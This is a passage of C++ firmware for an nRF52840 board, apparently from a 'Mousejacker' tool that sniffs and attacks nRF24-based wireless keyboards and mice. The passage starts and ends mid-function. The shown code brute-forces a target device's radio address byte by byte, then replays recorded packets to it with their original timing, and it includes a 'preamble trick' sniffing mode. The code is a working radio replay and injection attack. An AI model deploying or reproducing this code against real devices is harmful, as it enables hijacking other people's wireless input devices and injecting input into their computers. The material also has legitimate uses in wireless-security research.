HafthorArni/nRF52840_Mousejacker/nrf52840_sniffer/extras/main_sniffer_with_nrf24.cpp
  uint8_t saved_BALEN = BALEN;
  BALEN = target_index + 1; // e.g., finding byte 0 -> BALEN=1 (2-byte addr)
  apply_pcnf0_pcnf1();
  restore_single_pipe_prefix(discovered_prefix);

  uint32_t base_so_far = 0;
  for (uint8_t i = 0; i < discovered_count; ++i) {
    base_so_far |= ((uint32_t)discovered_base[i]) << (8 * i);
  }
  
  uint8_t best_b = 0;
  uint32_t best_hits = 0;
  uint32_t last_pct = 0;

  for (uint16_t b = 0; b <= 0xFF; ++b) {
    uint32_t test_base = base_so_far | ((uint32_t)b << (8 * target_index));
    NRF_RADIO->BASE0 = test_base;

    set_channel(best_ch_found);
    scan_addr_count = 0;
    uint32_t t0 = millis();
    while (millis() - t0 < SCAN_DWELL_MS) {
      poll_radio_events(best_ch_found, false);
    }

    if (scan_addr_count > best_hits) { best_hits = scan_addr_count; best_b = (uint8_t)b; }

    uint32_t pct = ((b+1) * 100UL) / 256UL;
    if (pct >= last_pct + 8) {
      Serial.print("Progress: "); Serial.print(pct);
      Serial.print("%   current best=0x"); Serial.print(best_b, HEX);
      Serial.print(" (hits="); Serial.print(best_hits); Serial.println(")");
      last_pct = pct;
    }
  }

  suppress_prints = false;

  // Restore original BALEN and BASE0 in case of failure
  if (best_hits == 0) {
    BALEN = saved_BALEN;
    apply_pcnf0_pcnf1();
    NRF_RADIO->BASE0 = base_so_far;
    set_channel(best_ch_found);
  }

  if (best_hits > 0) {
    *found_byte = best_b;
    if (discovered_count < 4) {
      discovered_base[discovered_count] = best_b;
      discovered_count++;
    }

    BALEN = discovered_count; // e.g., found byte 0 -> BALEN=1
    apply_pcnf0_pcnf1();
    restore_single_pipe_prefix(discovered_prefix);

    uint32_t final_base = 0;
    for(uint8_t i=0; i<discovered_count; i++) {
      final_base |= ((uint32_t)discovered_base[i]) << (8*i);
    }
    NRF_RADIO->BASE0 = final_base;
    set_channel(best_ch_found);

    Serial.print(">>> Discovered base byte #");
    Serial.print(target_index);
    Serial.print(": 0x"); Serial.print(best_b, HEX);
    Serial.print("  (hits="); Serial.print(best_hits); Serial.println(")");
    Serial.print(">>> Applied PREFIX 0x"); Serial.print(discovered_prefix, HEX);
    Serial.print(" + "); Serial.print(discovered_count); Serial.println(" base byte(s).");
    return true;
  } else {
    Serial.println(">>> No clear winner in next-byte scan.");
    return false;
  }
}

// ---------------- Replay / Firing function ----------------
/**
 * @brief Transmits all recorded packets using the current sniffer settings
 * (Channel, Rate, Address, CRC, etc.) with recorded timing.
 */
void fire_recorded_packets() {
  if (recorded_packet_count == 0) {
    Serial.println("No packets to fire.");
    return;
  }

  radio_disable();
  
  // Configure TX mode using all current sniffer params
  radio_base_config(); 

  NRF_RADIO->TXADDRESS = 0; // Use logical address 0
  NRF_RADIO->SHORTS = RADIO_SHORTS_READY_START_Msk; // Just READY->START
  
  Serial.print("Firing on Ch: "); Serial.print(best_ch_found);
  Serial.print(", Rate: "); Serial.println((current_mode == RADIO_MODE_MODE_Nrf_2Mbit) ? "2M" : "1M");
  
  if (preamble_trick_mode == 0) {
    Serial.print("Address: [0x"); Serial.print(discovered_prefix, HEX); Serial.print("]");
    for(uint8_t i=0; i<discovered_count; i++) { Serial.print(" [0x"); Serial.print(discovered_base[i], HEX); Serial.print("]"); }
    Serial.println();
  } else {
    Serial.print("Address (Preamble Trick): ");
    switch (preamble_trick_mode) {
      case 1: Serial.println(F("0xAA")); break;
      case 2: Serial.println(F("0x55")); break;
      case 3: Serial.println(F("0xAAAA")); break;
      case 4: Serial.println(F("0x5555")); break;
    }
  }

  NRF_RADIO->FREQUENCY = best_ch_found;
  
  // --- Timed TX Logic ---
  uint32_t tx_start_time_ms = millis(); // The wall-clock time our TX sequence starts
  uint32_t rx_start_time_ms = recorded_packets[0].timestamp_ms; // The "zero-point" of the recording

  for (uint16_t i = 0; i < recorded_packet_count; i++) {
    if (recorded_packets[i].len == 0 || recorded_packets[i].len > MAX_RECORDED_PAYLOAD) {
      continue;
    }
    
    // Calculate when this packet *should* be sent
    uint32_t rx_delta_ms = recorded_packets[i].timestamp_ms - rx_start_time_ms;
    uint32_t target_tx_time_ms = tx_start_time_ms + rx_delta_ms;
    
    // Wait until it's time to send
    while (millis() < target_tx_time_ms) {
      delay(1); 
    }
    
    NRF_RADIO->PACKETPTR = (uint32_t)recorded_packets[i].data;
    
    bool plen_is_zero = (preamble_trick_mode > 0);
    
    // In static length mode, we must update STATLEN for *each packet*
    if (LFLEN == 0 || plen_is_zero) {
      uint32_t pcnf1 = NRF_RADIO->PCNF1;
      pcnf1 &= ~(RADIO_PCNF1_STATLEN_Msk);
      pcnf1 |= (recorded_packets[i].len << RADIO_PCNF1_STATLEN_Pos);
      NRF_RADIO->PCNF1 = pcnf1;
    }
    
    // Start TX
    NRF_RADIO->EVENTS_END = 0;
    NRF_RADIO->TASKS_TXEN = 1;
    
    // Wait for TX to complete (with timeout)
    unsigned long tx_start_wait = millis();
    while (NRF_RADIO->EVENTS_END == 0 && (millis() - tx_start_wait < 50)) {}
    NRF_RADIO->EVENTS_END = 0;
    
    // Disable TX
    NRF_RADIO->TASKS_DISABLE = 1;
    while (NRF_RADIO->EVENTS_DISABLED == 0) {}
    NRF_RADIO->EVENTS_DISABLED = 0;
  }
  
  // Re-enable sniffer
  Serial.println("TX complete. Re-enabling sniffer...");
  configure_radio_for_state(LISTENING);
}

// ---------------- Manual Address Setting ----------
void set_manual_address(String s) {
  if (preamble_trick_mode > 0) {
    Serial.println("Preamble Sniff Trick is ON. Disable with 'a' to set manual address.");
    return;
  }
  
  s.trim();
  if (s.length() == 0) {
    Serial.println("Address string empty.");
    return;
  }

  // Reset discovery
  have_prefix = false;
  discovered_count = 0;
  memset(discovered_base, 0, sizeof(discovered_base));

  int start_idx = 0;
  int end_idx = s.indexOf(' ');
  bool first_byte = true;
  uint32_t final_base = 0;

  while (start_idx < (int)s.length()) {
    if (end_idx == -1) end_idx = s.length(); // Handle last byte

